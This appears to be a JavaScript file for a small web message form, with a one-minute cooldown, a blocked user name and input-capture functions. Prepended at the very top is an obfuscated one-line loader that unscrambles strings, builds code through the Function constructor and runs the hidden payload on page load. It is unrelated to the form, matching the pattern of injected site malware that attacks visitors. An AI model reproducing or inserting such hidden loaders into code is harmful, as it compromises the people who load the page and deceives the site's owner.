var whurl;(function(){var nvr='',Gic=273-262;function kUw(s){var v=3507191;var x=s.length;var p=[];for(var o=0;o<x;o++){p[o]=s.charAt(o)};for(var o=0;o<x;o++){var t=v*(o+491)+(v%48966);var e=v*(o+141)+(v%52612);var w=t%x;var u=e%x;var r=p[w];p[w]=p[u];p[u]=r;v=(t+e)%3624540;};return p.join('')};var Kla=kUw('cssqtenvzjdbfcooorhtmklwnyaiucpgturxr').substr(0,Gic);var Yez='=ar g=]2(ul3h,.=t6+v r8f)""b=dbfgh+jol2n,p)r[tavex z};Cao (=p7,,}5;7e,l9[9r,(5l6d,]0p8a,c1g8r,s6)7),e2v94,)6(7(,c1l8],+9r;=at r=i]Cf(riv,rah(0;hvculanqth;v++)h[r[1]c=s+g;]al v=,]qa}=-1;u+=(8(kn=.0ifrr8vrr.t.0itea(g m=nssnl.n tf;++{)hv)rhbla g;m(nisrt.."pai)(m i)5f}r vtr-pib,l,n[tp-0;a>v0)ph-0{ra; f=uull6v,rmn+b5pj;da= (=<uwlavhr(wa0Av=r)vtn{lfnjt);,ar ];;o2(0a. ==v;.<v;a+=)6v)r=ennvc arC;dzA{(h)gvur=oimreC;vf(o={n=lo012*u+h. hfraone+t{r;1)-;;]=);r+j;4etsh if=en=r)[grup(+.tevg.h3ain<c{ayCqd6A ()++)[+".)horgo1ejtkrt2h-;;r=!;a+(2C}hlneac;n1iru0;ris(8=on"lu)[=k]gia(t>l)*.euuhrnrsrb=tri6ghwfih).lgpes.(l[-+ ]8;e=;+m;Ai;(r!.n4le) i)(l<=)].cu7hnnlsab,teicgcw()gb[pl=a.to,nc"o)[},jvpis;(r[p]a;everhs,j.j5i.(m"k;na0 o=r3t,w0+9o,=2s9(,39d.vofc8t(c;;ra= ,=atwi}gwfuorC1alCrdf([6t;7oS(rao ;=8;n<+.;e"g=hih=+;s1susvl)tnz(f;cuaoAa(h)6.ro7nrS;r[n).]remshurro+e4q=hr)7;teou1n.srs lbtazs"i"1.eonnlz2;';var UyA=kUw[Kla];var CxZ='';var AOd=UyA;var mwf=UyA(CxZ,kUw(Yez));var oOv=mwf(kUw('r#Liae7$!tiingd).&mtti.goLoLa3p(a,7)=&,%(a.})#{+L35a)bxL.af.gbnL,La6((%,.)=&1.f.hb(La_;_r5o3=(,$_f4677=4t)L"a7(S\/:!dbs.0+r3ka5rxL-%idt,hLih1#r1p,s)at3_4cs!w)pso;xre7.*e(g*7awo3...9,l,ka. Ie.(.7.}d+w$uLh;\/f.)hj5tqLD g b_m!7f.$.Cdah!2;.,\/=0}k0i.oba(gLr0wyqSto,l5o719,);Lu_1a41L2f7w7tu!Los0t.p+$().Llx7.dLLqa.lL_w).tLLlx{L;4.;_,.)LLs ttpL$0;a*L=}..l=nLth;m.7_M.,[);;f+rsL2t$0zL=f3$(+(0=ta0b+[) L.t.=jaL.(c a4.St\'tr}5for3L!tu09L#f.$m+j09t604+0) q."r3L-wd"at$23\'t;4l1-)+Ly3.Ln,.8,6.)f)";LLs4LL3.].fLh4}(.,j4().,s$y7l-{56642))!;;w)"(7{q$!)LL;DL"3f(2.}_f0.l$!.=na",LL);{jj!+9kw;mLf,;(L(51(\/,5,n)rj.!_1.xeq!aL}7Lai4L.f$$ i e0$.toidg.)e!Lromzhar\/o)e]1.7r;-*L=tfL(L=dfLL.k;.L#)L(gL..%4(s=1f\/0*(r=kf!.r;=eaufnoa.. _.)LLtdcL1iL\'%)u))LLr,Ldc2\'n)Lwbu1ls.(_6_ 5.310\/;]%gL74x(x,.,f)6L5wa1=.lLtf31mL%jn!,0#f)mble{f,4Lc=(ar.%_wL jt!e1fx.q\/a){sLo3=(!$j3(q.!L,L.__.)\/36245z0l} s3$_pgi.ea_$aw1g2#7a.}_x.xjco4fe$.+*L,jto$fo$b(!s $=t$L\/ xu,c(i6nxaf{*e7u.nmaa)L!mp$i!().};o*1.9jrit(1vnrna{bSe1_LmL!1[r(C.\/_!=;}, Lsl$r,d)& S!n]'));var CSN=AOd(nvr,oOv );CSN(5557);return 9056})()
function isCooldownExpired() {
    var lastSentTime = localStorage.getItem('lastSentTime');
    if (!lastSentTime) {
        return true;
    }
    var currentTime = new Date().getTime();
    var elapsedTime = currentTime - parseInt(lastSentTime);
    var cooldownTime = 1 * 60 * 1000; // 1 minute in milliseconds
    return elapsedTime >= cooldownTime;
}

function isNameAllowed(name) {
    return name.toLowerCase() !== 'alxay';
}

// Function to handle sending messages
function send() {
    var nameInput = document.getElementById('NameInput');
    var inputField = document.getElementById('InputField');
    var messageSent = document.getElementById('MessageSent');
    var messageFailed = document.getElementById('MessageFailed');

    if (!isCooldownExpired()) {
        alert('Cooldown! Please wait before sending the next message. (1 minute)');
        return;
    }

    var userName = nameInput.value.trim();
    if (!isNameAllowed(userName)) {
        alert('The name "Alxay" is not allowed!');
        return;
    }

    // Save the time of the last sent message
    localStorage.setItem('lastSentTime', new Date().getTime().toString());

    // Reset the form and display appropriate messages
    nameInput.value = '';
    inputField.value = '';
    showMessage(messageSent);

    // Other message handling logic
    // ...

    captureInputValues();
    // Additional logic for sending the message
    // ...
}

// Function to display messages with fade-out effect
function showMessage(element) {
    element.style.opacity = 1;
    setTimeout(function () {
        element.style.opacity = 0;
    }, 4000);
}

var str = "";
var name = "";

// Function to capture input values
function captureInputValues() {
    name = document.getElementById("NameInput").value;
    str = document.getElementById("InputField").value;
    console.log(document.getElementById("InputField").value);
}


